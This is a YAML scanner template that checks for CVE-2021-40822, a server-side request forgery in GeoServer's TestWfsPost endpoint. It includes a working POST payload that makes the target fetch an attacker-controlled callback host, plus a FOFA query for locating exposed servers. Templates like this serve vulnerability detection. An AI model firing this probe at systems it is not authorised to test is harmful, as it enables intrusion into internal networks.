id: CVE-2021-40822

info:
  name: Geoserver - Server-Side Request Forgery
  author: For3stCo1d
  severity: high
  verified: false
  description: |
    GeoServer through 2.18.5 and 2.19.x through 2.19.2 allows server-side request forgery via the option for setting a proxy host.
    FOFA: app="GeoServer"
  reference:
    - https://gccybermonks.com/posts/cve-2021-40822/
    - https://github.com/geoserver/geoserver/compare/2.19.2...2.19.3
    - https://github.com/geoserver/geoserver/releases
    - https://nvd.nist.gov/vuln/detail/CVE-2021-40822
  tags: cve,cve2021,ssrf,geoserver
  created: 2023/06/16

set:
  reverse: newReverse()
  reverseURL: reverse.url.host
rules:
  r0:
    request:
      method: POST
      path: /geoserver/TestWfsPost
      body: form_hf_0=&url=http://{{reverseURL}}/geoserver/../&body=&username=&password=
    expression: reverse.wait(5)
expression: r0()